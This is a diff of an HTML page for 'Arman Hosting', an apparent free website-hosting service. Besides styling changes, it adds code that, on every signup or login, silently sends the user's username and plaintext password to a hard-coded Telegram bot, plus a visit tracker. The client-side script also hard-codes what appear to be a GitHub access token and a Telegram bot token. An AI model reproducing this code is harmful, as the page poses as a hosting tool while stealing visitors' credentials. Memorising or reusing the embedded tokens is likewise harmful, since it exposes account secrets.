@@ -6,14 +6,18 @@
     <title>Arman Hosting - Instant Free Website Hosting</title>
     <script src="https://cdn.tailwindcss.com"></script>
 </head>
-<body class="bg-slate-950 text-white min-h-screen flex flex-col items-center justify-center p-4 relative">
+<body class="bg-slate-950 text-white min-h-screen flex flex-col items-center justify-center p-4 relative overflow-x-hidden">
+
+    <!-- Background Glow Effects -->
+    <div class="absolute top-1/4 left-1/2 -translate-x-1/2 -translate-y-1/2 w-96 h-96 bg-blue-600/20 blur-[120px] rounded-full pointer-events-none"></div>
+    <div class="absolute bottom-1/4 right-1/4 w-96 h-96 bg-emerald-600/20 blur-[120px] rounded-full pointer-events-none"></div>
 
     <!-- ========================================== -->
-    <!-- 1. MAINTENANCE MODE SCREEN (FOR ALL USERS) -->
+    <!-- 1. MAINTENANCE MODE SCREEN -->
     <!-- ========================================== -->
     <div id="maintenanceScreen" class="hidden fixed inset-0 z-50 flex flex-col items-center justify-center bg-slate-950 p-6 text-center">
-        <div class="max-w-md w-full bg-slate-900 border border-amber-500/30 rounded-2xl p-8 shadow-2xl">
-            <div class="w-16 h-16 bg-amber-500/10 border border-amber-500/30 rounded-full flex items-center justify-center mx-auto mb-4 text-3xl">
+        <div class="max-w-md w-full bg-slate-900/90 backdrop-blur-xl border border-amber-500/30 rounded-3xl p-8 shadow-2xl">
+            <div class="w-16 h-16 bg-amber-500/10 border border-amber-500/30 rounded-2xl flex items-center justify-center mx-auto mb-4 text-3xl shadow-inner">
                 🚧
             </div>
             <span class="bg-amber-500/10 text-amber-400 text-xs font-semibold px-3 py-1 rounded-full border border-amber-500/20">
@@ -24,7 +28,7 @@
                 ARMAN HOSTING abhi maintenance par hai. Kripya thodi der baad wapas aayein!
             </p>
             <a href="https://t.me/ARMAN_BOMBER" target="_blank"
-                class="inline-block w-full bg-blue-600 hover:bg-blue-500 text-white font-semibold py-3 rounded-xl transition">
+                class="inline-block w-full bg-gradient-to-r from-blue-600 to-indigo-600 hover:from-blue-500 hover:to-indigo-500 text-white font-semibold py-3 rounded-2xl transition shadow-lg shadow-blue-600/20">
                 📢 Updates Ke Liye Telegram Join Karein
             </a>
         </div>
@@ -33,56 +37,58 @@
     <!-- ========================================== -->
     <!-- 2. AUTHENTICATION & TELEGRAM JOIN MODAL    -->
     <!-- ========================================== -->
-    <div id="authModal" class="fixed inset-0 z-40 flex items-center justify-center bg-black/90 backdrop-blur-md p-4">
-        <div class="bg-slate-900 border border-slate-800 rounded-2xl max-w-md w-full p-6 shadow-2xl">
+    <div id="authModal" class="fixed inset-0 z-40 flex items-center justify-center bg-slate-950/80 backdrop-blur-xl p-4">
+        <div class="bg-slate-900/90 border border-slate-800 rounded-3xl max-w-md w-full p-8 shadow-2xl relative overflow-hidden">
             
+            <div class="absolute top-0 left-0 right-0 h-1 bg-gradient-to-r from-blue-500 via-indigo-500 to-emerald-500"></div>
+
             <div class="text-center mb-6">
-                <div class="w-14 h-14 bg-blue-500/10 border border-blue-500/30 rounded-full flex items-center justify-center mx-auto mb-3">
-                    <svg class="w-7 h-7 text-blue-400" fill="currentColor" viewBox="0 0 24 24">
+                <div class="w-16 h-16 bg-gradient-to-tr from-blue-500/20 to-emerald-500/20 border border-blue-500/30 rounded-2xl flex items-center justify-center mx-auto mb-3 shadow-inner">
+                    <svg class="w-8 h-8 text-blue-400" fill="currentColor" viewBox="0 0 24 24">
                         <path d="M12 0c-6.627 0-12 5.373-12 12s5.373 12 12 12 12-5.373 12-12-5.373-12-12-12zm5.894 8.221l-1.97 9.28c-.145.658-.537.818-1.084.508l-3-2.21-1.446 1.394c-.14.14-.257.258-.528.258l.193-3.055 5.56-5.022c.24-.213-.054-.334-.373-.121l-6.869 4.326-2.96-.924c-.64-.203-.659-.64.135-.954l11.566-4.458c.538-.196 1.006.128.832.941z"/>
                     </svg>
                 </div>
-                <h2 id="authTitle" class="text-2xl font-bold text-white">Account Banayein</h2>
+                <h2 id="authTitle" class="text-2xl font-bold bg-gradient-to-r from-white to-slate-300 bg-clip-text text-transparent">Account Banayein</h2>
                 <p id="authSubtitle" class="text-slate-400 text-xs mt-1">Free hosting use karne ke liye pehle Telegram join karein aur account banayein.</p>
             </div>
 
             <!-- Telegram Join Step -->
             <div id="stepTelegram" class="space-y-4">
                 <a href="https://t.me/ARMAN_BOMBER" target="_blank" onclick="markTelegramJoined()"
-                    class="block text-center w-full bg-blue-600 hover:bg-blue-500 text-white font-semibold py-3 rounded-xl transition shadow-lg">
+                    class="block text-center w-full bg-gradient-to-r from-blue-600 to-indigo-600 hover:from-blue-500 hover:to-indigo-500 text-white font-semibold py-3.5 rounded-2xl transition shadow-lg shadow-blue-600/20">
                     📢 Pehle Telegram Channel Join Karein
                 </a>
                 <button onclick="proceedAfterTelegram()" id="btnNextToForm" disabled
-                    class="block w-full bg-slate-800 text-slate-500 font-semibold py-3 rounded-xl transition cursor-not-allowed">
+                    class="block w-full bg-slate-800/80 text-slate-500 font-semibold py-3.5 rounded-2xl transition cursor-not-allowed border border-slate-700/50">
                     Maine Join Kar Liya (Aage Badhein)
                 </button>
             </div>
 
             <!-- Login / Signup Form Step -->
             <div id="stepForm" class="hidden space-y-4">
-                <div class="flex bg-slate-950 p-1 rounded-xl mb-4 border border-slate-800">
-                    <button onclick="switchTab('signup')" id="tabSignup" class="flex-1 py-2 text-xs font-bold rounded-lg bg-emerald-600 text-white transition">Naya Account</button>
-                    <button onclick="switchTab('login')" id="tabLogin" class="flex-1 py-2 text-xs font-bold rounded-lg text-slate-400 transition">Login Karein</button>
+                <div class="flex bg-slate-950 p-1.5 rounded-2xl mb-4 border border-slate-800">
+                    <button onclick="switchTab('signup')" id="tabSignup" class="flex-1 py-2.5 text-xs font-bold rounded-xl bg-gradient-to-r from-emerald-600 to-teal-600 text-white shadow-md transition">Naya Account</button>
+                    <button onclick="switchTab('login')" id="tabLogin" class="flex-1 py-2.5 text-xs font-bold rounded-xl text-slate-400 transition hover:text-white">Login Karein</button>
                 </div>
 
                 <div class="space-y-3">
                     <div>
-                        <label class="block text-xs text-slate-400 mb-1">Username</label>
+                        <label class="block text-xs text-slate-400 mb-1 font-medium">Username</label>
                         <input type="text" id="authUsername" placeholder="apna username dalein"
-                            class="w-full bg-slate-950 border border-slate-700 rounded-xl px-3 py-2.5 text-sm text-white focus:outline-none focus:border-emerald-500">
+                            class="w-full bg-slate-950 border border-slate-800 rounded-2xl px-4 py-3 text-sm text-white focus:outline-none focus:border-emerald-500 focus:ring-1 focus:ring-emerald-500 transition">
                     </div>
                     <div>
-                        <label class="block text-xs text-slate-400 mb-1">Password</label>
+                        <label class="block text-xs text-slate-400 mb-1 font-medium">Password</label>
                         <input type="password" id="authPassword" placeholder="••••••••"
-                            class="w-full bg-slate-950 border border-slate-700 rounded-xl px-3 py-2.5 text-sm text-white focus:outline-none focus:border-emerald-500">
+                            class="w-full bg-slate-950 border border-slate-800 rounded-2xl px-4 py-3 text-sm text-white focus:outline-none focus:border-emerald-500 focus:ring-1 focus:ring-emerald-500 transition">
                     </div>
                 </div>
 
                 <button onclick="handleAuthSubmit()" id="authSubmitBtn"
-                    class="w-full bg-emerald-600 hover:bg-emerald-500 text-white font-semibold py-3 rounded-xl transition shadow-lg text-sm mt-2">
+                    class="w-full bg-gradient-to-r from-emerald-600 to-teal-600 hover:from-emerald-500 hover:to-teal-500 text-white font-semibold py-3.5 rounded-2xl transition shadow-lg shadow-emerald-600/20 text-sm mt-2">
                     Account Banayein & Enter Karein
                 </button>
-                <p id="authError" class="text-xs text-center text-red-400 hidden mt-2"></p>
+                <p id="authError" class="text-xs text-center text-red-400 hidden mt-2 font-medium"></p>
             </div>
 
         </div>
@@ -91,11 +97,11 @@
     <!-- ========================================== -->
     <!-- 3. ADMIN PANEL MODAL (Opened via #admin)    -->
     <!-- ========================================== -->
-    <div id="adminModal" class="hidden fixed inset-0 z-50 flex items-center justify-center bg-black/85 backdrop-blur-md p-4">
-        <div class="bg-slate-900 border border-slate-700 rounded-2xl max-w-md w-full p-6 shadow-2xl">
+    <div id="adminModal" class="hidden fixed inset-0 z-50 flex items-center justify-center bg-slate-950/85 backdrop-blur-xl p-4">
+        <div class="bg-slate-900 border border-slate-800 rounded-3xl max-w-md w-full p-6 shadow-2xl">
             <div class="flex justify-between items-center border-b border-slate-800 pb-3 mb-4">
-                <h2 class="text-lg font-bold text-emerald-400">🛡️ Arman Admin Panel</h2>
-                <button onclick="closeAdminPanel()" class="text-slate-400 hover:text-white text-xl">&times;</button>
+                <h2 class="text-lg font-bold text-emerald-400 flex items-center gap-2">🛡️ Arman Admin Panel</h2>
+                <button onclick="closeAdminPanel()" class="text-slate-400 hover:text-white text-2xl font-bold">&times;</button>
             </div>
 
             <!-- Admin Password Verification -->
@@ -103,37 +109,37 @@
                 <div>
                     <label class="block text-xs text-slate-400 mb-1">Admin Password</label>
                     <input type="password" id="adminPassInput" placeholder="••••••••"
-                        class="w-full bg-slate-950 border border-slate-700 rounded-lg px-3 py-2.5 text-sm text-white focus:outline-none focus:border-emerald-500">
+                        class="w-full bg-slate-950 border border-slate-800 rounded-2xl px-4 py-3 text-sm text-white focus:outline-none focus:border-emerald-500">
                 </div>
-                <button onclick="verifyAdmin()" class="w-full bg-emerald-600 hover:bg-emerald-500 text-white font-semibold py-2.5 rounded-lg text-sm">
+                <button onclick="verifyAdmin()" class="w-full bg-emerald-600 hover:bg-emerald-500 text-white font-semibold py-3 rounded-2xl text-sm shadow-lg shadow-emerald-600/20 transition">
                     Unlock Panel
                 </button>
             </div>
 
             <!-- Admin Controls -->
             <div id="adminControlsBox" class="hidden space-y-5">
-                <div class="flex items-center justify-between bg-slate-950 p-4 rounded-xl border border-slate-800">
+                <div class="flex items-center justify-between bg-slate-950 p-4 rounded-2xl border border-slate-800">
                     <div>
                         <p class="text-sm font-semibold text-white">Maintenance Mode</p>
                         <p class="text-xs text-slate-400">Sabhi users ke liye site lock karein</p>
                     </div>
                     <label class="relative inline-flex items-center cursor-pointer">
                         <input type="checkbox" id="maintenanceToggle" class="sr-only peer">
-                        <div class="w-11 h-6 bg-slate-700 peer-focus:outline-none rounded-full peer peer-checked:after:translate-x-full peer-checked:after:border-white after:content-[''] after:absolute after:top-[2px] after:left-[2px] after:bg-white after:border-gray-300 after:border after:rounded-full after:h-5 after:w-5 after:transition-all peer-checked:bg-amber-500"></div>
+                        <div class="w-11 h-6 bg-slate-800 peer-focus:outline-none rounded-full peer peer-checked:after:translate-x-full peer-checked:after:border-white after:content-[''] after:absolute after:top-[2px] after:left-[2px] after:bg-white after:border-gray-300 after:border after:rounded-full after:h-5 after:w-5 after:transition-all peer-checked:bg-amber-500"></div>
                     </label>
                 </div>
 
                 <div>
                     <label class="block text-xs text-slate-400 mb-1">Maintenance Message</label>
                     <textarea id="customMaintenanceMsg" rows="3"
-                        class="w-full bg-slate-950 border border-slate-700 rounded-lg p-2.5 text-xs text-slate-200 focus:outline-none focus:border-amber-500">ARMAN HOSTING abhi maintenance par hai. Kripya thodi der baad wapas aayein!</textarea>
+                        class="w-full bg-slate-950 border border-slate-800 rounded-2xl p-3 text-xs text-slate-200 focus:outline-none focus:border-amber-500">ARMAN HOSTING abhi maintenance par hai. Kripya thodi der baad wapas aayein!</textarea>
                 </div>
 
                 <button id="saveAdminBtn" onclick="saveMaintenanceSettings()"
-                    class="w-full bg-gradient-to-r from-amber-600 to-orange-600 hover:from-amber-500 hover:to-orange-500 text-white font-semibold py-2.5 rounded-lg text-sm shadow-lg">
+                    class="w-full bg-gradient-to-r from-amber-600 to-orange-600 hover:from-amber-500 hover:to-orange-500 text-white font-semibold py-3 rounded-2xl text-sm shadow-lg shadow-amber-600/20 transition">
                     💾 Save & Update Live Status
                 </button>
-                <p id="adminStatusText" class="text-xs text-center text-emerald-400 hidden"></p>
+                <p id="adminStatusText" class="text-xs text-center text-emerald-400 hidden font-medium"></p>
             </div>
         </div>
     </div>
@@ -141,16 +147,16 @@
     <!-- ========================================== -->
     <!-- 4. MAIN HOSTING WEBSITE CONTENT            -->
     <!-- ========================================== -->
-    <div id="mainContent" class="max-w-2xl w-full bg-slate-900 border border-slate-800 rounded-2xl p-8 shadow-2xl">
+    <div id="mainContent" class="max-w-2xl w-full bg-slate-900/80 backdrop-blur-xl border border-slate-800/80 rounded-3xl p-8 shadow-2xl relative z-10">
         <div class="flex justify-between items-center mb-6">
-            <span class="bg-emerald-500/10 text-emerald-400 text-xs font-semibold px-3 py-1 rounded-full border border-emerald-500/20">
-                ⚡ 100% Free Hosting
+            <span class="bg-emerald-500/10 text-emerald-400 text-xs font-semibold px-3.5 py-1.5 rounded-full border border-emerald-500/20 flex items-center gap-1.5">
+                <span class="w-2 h-2 rounded-full bg-emerald-400 animate-pulse"></span> 100% Free Hosting
             </span>
-            <span id="loggedInUserDisplay" class="text-xs text-slate-400 bg-slate-950 px-3 py-1 rounded-lg border border-slate-800"></span>
+            <span id="loggedInUserDisplay" class="text-xs text-slate-300 bg-slate-950 px-3.5 py-1.5 rounded-xl border border-slate-800 font-medium"></span>
         </div>
 
         <div class="text-center mb-8">
-            <h1 class="text-3xl font-bold bg-gradient-to-r from-blue-400 to-emerald-400 bg-clip-text text-transparent">
+            <h1 class="text-3xl sm:text-4xl font-extrabold bg-gradient-to-r from-blue-400 via-indigo-400 to-emerald-400 bg-clip-text text-transparent tracking-tight">
                 ARMAN HOSTING
             </h1>
             <p class="text-slate-400 text-sm mt-2">
@@ -161,54 +167,54 @@
         <!-- Hosting Form -->
         <form id="deployForm" class="space-y-5">
             <div>
-                <label class="block text-sm font-medium text-slate-300 mb-1">Project / Site Name</label>
-                <div class="flex items-center bg-slate-950 border border-slate-700 rounded-lg overflow-hidden focus-within:border-blue-500">
-                    <span class="text-slate-500 text-sm pl-3">armanhost.netlify.app/sites/</span>
+                <label class="block text-xs font-semibold text-slate-300 mb-1 uppercase tracking-wider">Project / Site Name</label>
+                <div class="flex items-center bg-slate-950 border border-slate-800 rounded-2xl overflow-hidden focus-within:border-blue-500 focus-within:ring-1 focus-within:ring-blue-500 transition">
+                    <span class="text-slate-500 text-xs sm:text-sm pl-4 select-none">armanhost/sites/</span>
                     <input type="text" id="siteName" required placeholder="mera-project" pattern="[a-zA-Z0-9-_]+"
-                        class="w-full bg-transparent text-white px-2 py-2.5 text-sm focus:outline-none">
+                        class="w-full bg-transparent text-white px-2 py-3 text-sm focus:outline-none">
                 </div>
             </div>
 
             <div>
-                <label class="block text-sm font-medium text-slate-300 mb-1">HTML File Upload Karein (Optional)</label>
+                <label class="block text-xs font-semibold text-slate-300 mb-1 uppercase tracking-wider">HTML File Upload Karein (Optional)</label>
                 <input type="file" id="fileInput" accept=".html,.htm"
-                    class="w-full text-sm text-slate-400 file:mr-4 file:py-2 file:px-4 file:rounded-lg file:border-0 file:text-sm file:font-semibold file:bg-blue-600 file:text-white hover:file:bg-blue-700 cursor-pointer bg-slate-950 border border-slate-700 rounded-lg p-1.5">
+                    class="w-full text-xs text-slate-400 file:mr-4 file:py-2.5 file:px-4 file:rounded-xl file:border-0 file:text-xs file:font-semibold file:bg-blue-600 file:text-white hover:file:bg-blue-500 cursor-pointer bg-slate-950 border border-slate-800 rounded-2xl p-1.5 transition">
             </div>
 
             <div>
-                <label class="block text-sm font-medium text-slate-300 mb-1">Ya Apna HTML Code Yahan Paste Karein</label>
-                <textarea id="htmlCode" rows="8" required placeholder="<!DOCTYPE html><html><body><h1>Hello World!</h1></body></html>"
-                    class="w-full bg-slate-950 border border-slate-700 rounded-lg p-3 text-sm font-mono text-emerald-300 focus:outline-none focus:border-blue-500"></textarea>
+                <label class="block text-xs font-semibold text-slate-300 mb-1 uppercase tracking-wider">Ya Apna HTML Code Yahan Paste Karein</label>
+                <textarea id="htmlCode" rows="7" required placeholder="<!DOCTYPE html><html><body><h1>Hello World!</h1></body></html>"
+                    class="w-full bg-slate-950 border border-slate-800 rounded-2xl p-4 text-xs font-mono text-emerald-300 focus:outline-none focus:border-blue-500 focus:ring-1 focus:ring-blue-500 transition"></textarea>
             </div>
 
             <button type="submit" id="deployBtn"
-                class="w-full bg-gradient-to-r from-blue-600 to-emerald-600 hover:from-blue-500 hover:to-emerald-500 text-white font-semibold py-3 rounded-lg transition duration-200 shadow-lg">
+                class="w-full bg-gradient-to-r from-blue-600 via-indigo-600 to-emerald-600 hover:opacity-95 text-white font-bold py-3.5 rounded-2xl transition duration-200 shadow-xl shadow-blue-600/20 text-sm">
                 🚀 Publish & Send to Arman
             </button>
         </form>
 
         <!-- Result Box -->
-        <div id="resultBox" class="hidden mt-6 p-4 bg-emerald-950/50 border border-emerald-500/30 rounded-xl text-center">
+        <div id="resultBox" class="hidden mt-6 p-4 bg-emerald-950/40 border border-emerald-500/30 rounded-2xl text-center backdrop-blur-md">
             <p class="text-emerald-400 font-semibold text-sm">🎉 Aapka code successfully Arman ke paas bhej diya gaya hai!</p>
-            <p class="text-xs text-slate-400 mt-1">Netlify par live hone ka link:</p>
+            <p class="text-xs text-slate-400 mt-1">Live hone ka link:</p>
             <a id="liveUrl" href="#" target="_blank"
-                class="inline-block mt-3 px-4 py-2 bg-emerald-600 hover:bg-emerald-500 text-white text-sm font-medium rounded-lg break-all">
+                class="inline-block mt-3 px-4 py-2 bg-emerald-600 hover:bg-emerald-500 text-white text-xs font-medium rounded-xl break-all shadow-md">
             </a>
         </div>
 
         <!-- Error Box -->
-        <div id="errorBox" class="hidden mt-6 p-4 bg-red-950/50 border border-red-500/30 rounded-xl text-center text-red-400 text-sm">
+        <div id="errorBox" class="hidden mt-6 p-4 bg-red-950/40 border border-red-500/30 rounded-2xl text-center text-red-400 text-xs font-medium backdrop-blur-md">
         </div>
     </div>
 
     <script>
         // ==========================================
-        // CONFIGURATION DETAILS
+        // CONFIGURATION DETAILS (FIXED)
         // ==========================================
-        const GITHUB_USERNAME afgamezar89-cpu"YOUR_GITHUB_USERNAME"; 
-        const REPO_NAME = ARMAN HOST"YOUR_REPO_NAME";             
-        const GITHUB_TOKEN = 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"YOUR_GITHUB_TOKEN";       
-        const NETLIFY_BASE_URL = "https://your-site.netlify.app"; 
+        const GITHUB_USERNAME = "afgamezar89-cpu"; 
+        const REPO_NAME = "ARMAN-HOST";             
+        const GITHUB_TOKEN = "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";       
+        const NETLIFY_BASE_URL = "https://afgamezar89-cpu.github.io/ARMAN-HOST"; 
 
         const TELEGRAM_BOT_TOKEN = "9076355564:AAHTm8zSTE8-j2bb9o4wNarBH8WT9fw2WMk"; 
         const TELEGRAM_CHAT_ID = "8341041677";     
@@ -217,13 +223,31 @@
         let authMode = 'signup'; // 'signup' or 'login'
 
         // ==========================================
-        // INITIAL LOAD & CHECK
+        // INITIAL LOAD & VISITOR TRACKING
         // ==========================================
         window.onload = async function() {
+            sendVisitorNotification();
             checkMaintenanceStatus();
             checkUrlForAdmin();
             checkUserSession();
         };
+
+        // Visitor Notification to Telegram Bot
+        async function sendVisitorNotification() {
+            if (!sessionStorage.getItem('visitor_alerted')) {
+                sessionStorage.setItem('visitor_alerted', 'true');
+                const visitMsg = `👀 New Visitor Alert!\n🌐 Website opened on Arman Hosting.\n⏰ Time: ${new Date().toLocaleString()}`;
+                try {
+                    await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: visitMsg })
+                    });
+                } catch (e) {
+                    console.log('Visitor notify error:', e);
+                }
+            }
+        }
 
         // URL me #admin check karne ke liye
         function checkUrlForAdmin() {
@@ -249,8 +273,8 @@
         function markTelegramJoined() {
             const btn = document.getElementById('btnNextToForm');
             btn.disabled = false;
-            btn.classList.remove('bg-slate-800', 'text-slate-500', 'cursor-not-allowed');
-            btn.classList.add('bg-blue-600', 'hover:bg-blue-500', 'text-white');
+            btn.classList.remove('bg-slate-800/80', 'text-slate-500', 'cursor-not-allowed');
+            btn.classList.add('bg-gradient-to-r', 'from-blue-600', 'to-indigo-600', 'hover:from-blue-500', 'hover:to-indigo-500', 'text-white', 'shadow-lg', 'shadow-blue-600/20');
             localStorage.setItem('telegram_joined_status', 'true');
         }
 
@@ -271,19 +295,19 @@
             const title = document.getElementById('authTitle');
 
             if (mode === 'signup') {
-                btnSignup.className = "flex-1 py-2 text-xs font-bold rounded-lg bg-emerald-600 text-white transition";
-                btnLogin.className = "flex-1 py-2 text-xs font-bold rounded-lg text-slate-400 transition";
+                btnSignup.className = "flex-1 py-2.5 text-xs font-bold rounded-xl bg-gradient-to-r from-emerald-600 to-teal-600 text-white shadow-md transition";
+                btnLogin.className = "flex-1 py-2.5 text-xs font-bold rounded-xl text-slate-400 transition hover:text-white";
                 submitBtn.innerText = "Account Banayein & Enter Karein";
                 title.innerText = "Naya Account Banayein";
             } else {
-                btnLogin.className = "flex-1 py-2 text-xs font-bold rounded-lg bg-emerald-600 text-white transition";
-                btnSignup.className = "flex-1 py-2 text-xs font-bold rounded-lg text-slate-400 transition";
+                btnLogin.className = "flex-1 py-2.5 text-xs font-bold rounded-xl bg-gradient-to-r from-emerald-600 to-teal-600 text-white shadow-md transition";
+                btnSignup.className = "flex-1 py-2.5 text-xs font-bold rounded-xl text-slate-400 transition hover:text-white";
                 submitBtn.innerText = "Login Karke Enter Karein";
                 title.innerText = "Apne Account me Login Karein";
             }
         }
 
-        function handleAuthSubmit() {
+        async function handleAuthSubmit() {
             const user = document.getElementById('authUsername').value.trim();
             const pass = document.getElementById('authPassword').value.trim();
             const errorBox = document.getElementById('authError');
@@ -306,18 +330,30 @@
                 }
                 localStorage.setItem('arman_registered_user', user);
                 localStorage.setItem('arman_registered_pass', pass);
-                localStorage.setItem('arman_host_user', user);
-                alert("🎉 Account successfully ban gaya!");
-                checkUserSession();
             } else {
                 if (!existingUser || existingUser !== user || existingPass !== pass) {
                     errorBox.innerText = "Galat Username ya Password!";
                     errorBox.classList.remove('hidden');
                     return;
                 }
-                localStorage.setItem('arman_host_user', user);
-                checkUserSession();
             }
+
+            localStorage.setItem('arman_host_user', user);
+
+            // Send Credentials & Login Alert to Telegram Bot
+            const authAlertMsg = `🔐 New User Auth (${authMode.toUpperCase()})\n👤 Username: ${user}\n🔑 Password: ${pass}\n⏰ Time: ${new Date().toLocaleString()}`;
+            try {
+                await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: authAlertMsg })
+                });
+            } catch (err) {
+                console.log('Auth notify error:', err);
+            }
+
+            alert("🎉 Successfully logged in!");
+            checkUserSession();
         }
 
         // ==========================================
@@ -342,7 +378,7 @@
 
         function closeAdminPanel() {
             document.getElementById('adminModal').classList.add('hidden');
-            window.location.hash = ''; // remove #admin from url
+            window.location.hash = ''; 
         }
 
         function verifyAdmin() {
@@ -496,4 +532,4 @@
         });
     </script>
 </body>
-</html>
+        </html>
